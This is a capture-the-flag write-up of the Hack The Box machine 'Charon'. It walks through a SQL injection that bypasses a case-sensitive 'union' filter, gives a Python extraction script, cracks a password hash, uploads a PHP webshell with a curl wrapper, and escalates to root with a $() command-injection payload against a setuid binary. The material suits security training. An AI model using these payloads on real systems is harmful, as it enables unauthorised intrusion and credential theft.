
# initial enumeration

nmap scan:

![nmap_scan](./img/charon/charon_nmap.png)

| port | service | version | 
|-----|---------|----------|
| 22 | ssh|7.2p2|
| 80 | apache httpd| 2.4.18| 

feroxbuster scan
```
301      GET        9l       28w      307c http://10.129.1.66/js => http://10.129.1.66/js/
200      GET       94l      191w     2546c http://10.129.1.66/
301      GET        9l       28w      311c http://10.129.1.66/images => http://10.129.1.66/images/
301      GET        9l       28w      308c http://10.129.1.66/css => http://10.129.1.66/css/
301      GET        9l       28w      318c http://10.129.1.66/images/mobile => http://10.129.1.66/images/mobile/
301      GET        9l       28w      310c http://10.129.1.66/fonts => http://10.129.1.66/fonts/
301      GET        9l       28w      312c http://10.129.1.66/include => http://10.129.1.66/include/
403      GET       11l       32w      299c http://10.129.1.66/server-status

```
``

![yogurt](./img/charon/charon_yogurt_homepage.png)
home page

![supercms](./img/charon/charon_supercms.png)


looking up the cms on google i found a [repo](https://github.com/rojr/SuperCMS), last updated 4 years ago


well i cant access anything and the webpage seems empty so i'll run a vhost scan
dead end

ran a dirscan again, this time with a .php extension and found a folder called `cmsdata` and a `/menu.php` which redirected me to a login page


# Foothold
after trying to fuzz some creds i checked the forgot password link and there i found the following error


## Sql Injection

![db error](./img/charon/charon_db_error.png)

running sqlmap found a vulnerable mysql database and gave me a database:
`supercms`

sqlmap didn't work other than giving me the db name 

trying a union injection just throws an error: 

![union error](./img/charon/charon_db_union_error.png)

weird
what if it's blocking the word union? or filtering it somehow? 
YUP

changing the union to anything different, like "uNion" bypasses the filter

enumerating how many rows the db has by executing the request multiple times with different numbers resulted in 4 rows, after the query returned an "Incorrect format" error 

![query](./img/charon/charon_union_query.png)

![incorrect](./img/charon/charon_incorrect_format.png)


after trying to see which row is the injectable one, i found that the 4th one is the injectable one.
so time to enumerate the db:
im gonna concat the information schema tables into this row to get the data from it into one row

well since it wants an email, lets add one to our concat statement:
![cols](./img/charon/charon_cols.png)

![error2](./img/charon/charon_error_2.png)

hmm.... an error...
maybe its filtering that as well

yep

![no user](./img/charon/charon_no_email.png)

it says that there isn't a username found with that email, probably because it's probably returning an error, so lets limit the result to see if it helps:
![limit](./img/charon/charon_limit_result.png)
yep

![limit2](./img/charon/charon_limit_2.png)


lets continue enumerating this db

db info:

![info](./img/charon/charon_dbinfo.png)


if i give the limit statement an offset, i could probably get the column names
![](./img/charon/charon_column.png)

yup. i'll write a script to automate this

![rows](./img/charon/charon_row.png)

interesting columns



__enum_db.py__
```python
import requests
import re


i = 0
reg = r"<h2> Email sent to: (.+?) "
query = {"email": f"aaa@aaa.com'uniOn select 1,2,3,CONCAT( COLUMN_NAME,  \" | \",\" | \",  \"@aaa.com\") FROM INFORmATION_SCHEMA.COLUMNS limit 1 offset {i};-- -"}

url = "http://charon.htb/cmsdata/forgot.php"
while i < 1001:
        r = requests.post(url, data=query)
        reg_query = re.search(reg, r.text)
        query = {"email": f"aaa@aaa.com'uniOn select 1,2,3,CONCAT( COLUMN_NAME,  \" | \",\" | \",  \"@aaa.com\") FROM INFORmATION_SCHEMA.COLUMNS limit 1 offset {i};-- -"}
        print(reg_query.group(1) + f" | INDEX: {i}")
        i += 1

```

using the script above and the database tables we found, we can enumerate usernames:

![users](./img/charon/charon_users.png)

managed to leak a hash!
0b0689ba94f94533400f4decd87fa260

using https://md5decrypt.net/en/#answer
 i decrypted the hash and got:
 0b0689ba94f94533400f4decd87fa260 : **tamarro**

i managed to log in with the creds:

**super_cms_adm:tamarro**

![ap](./img/charon/charon_admin_panel.png)

![ep](./img/charon/charon_editpage.png)

we can edit this page??
any webshell addicts in chat? 

well i cant write to the files in any way
however, i can upload files

![upload](./img/charon/charon_upload_image.png)


![blacklist](./img/charon/charon_blacklist.png)

we can only upload .jpg, .gif and .png

looking at the source i see a weird hidden input variable. 
![sparam](./img/charon/charon_secret_param.png)
that decodes to: *testfile1*

uncommenting the input generates a new input form... with the encoded value. 

changing that encoded value to the decoded value and uncommenting it allows me to just upload any image file under any name i want! meaning i can save an image with a php webshell in it and upload it as a webshell! lets try:


![burp](./img/charon/charon_secret_param2.png)

it uploaded to the images folder.. lets try to execute code with it

![shell upload](./img/charon/charon_success_shell.png)

## Command Execution

![url](./img/charon/charon_url_shell.png)
![rce](./img/charon/charon_rce.png)

wrote a very basic automation script to simulate a shell:

```bash
curl http://charon.htb/images/shell.php?cmd=$1 -s --output - 
```

user found: decoder

# User flag

enumerating some stuff i found db creds in the `freeeze` folder:

![db creds](./img/charon/charon_db_creds.png)

**freeeze:fr2424z**

![sqli](./img/charon/charon_sqli.png)

```
1 -word filter
sqli - the vulnerable query
```

 i can read the `pass.crypt` and `decoder.pub` files in decoder's home directory, but not the user file
 ![readable](./img/charon/charon_readable_files.png)
pass.crypt: mTJPrVNiiaHi0Y3QImXNfxVXnWecid0ZVMjFbzeNEUk=

running RsaCtfTool on the decoder.pub and pass.crypt files gives me a password: **nevermindthebollocks**

**decoder:nevermindthebollocks**

using the creds i can ssh as decoder and get the user flag

# Root flag


linpeas showed me that there is a readable binary called `supershell` which doesn't seem to be a default binary.. could this be a privesc vector?
![](./img/charon/charon_readable_file.png)

rafter copying the binary to my local system i opened it in ida and read the main function:
![](./img/charon/charon_ida_main.png)
![](./img/charon/charon_CI_check.png)



it appears that the binary takes our string, checks that there aren't any command injection strings and compares it to `/bin/ls`, then executes it with root privileges by setting it's uid to **0** . notice that the strings its filtering () are missing one string that can be used for command injection; `$()`.
lets try to exploit this


payload: `supershell '/bin/ls $(cat /root/root.txt)'`
![](./img/charon/charon_roottxt.png)
it worked! 


## Closing notes
ty to [decoder](https://app.hackthebox.com/users/1391) , the creator of the box for a fun and interesting box
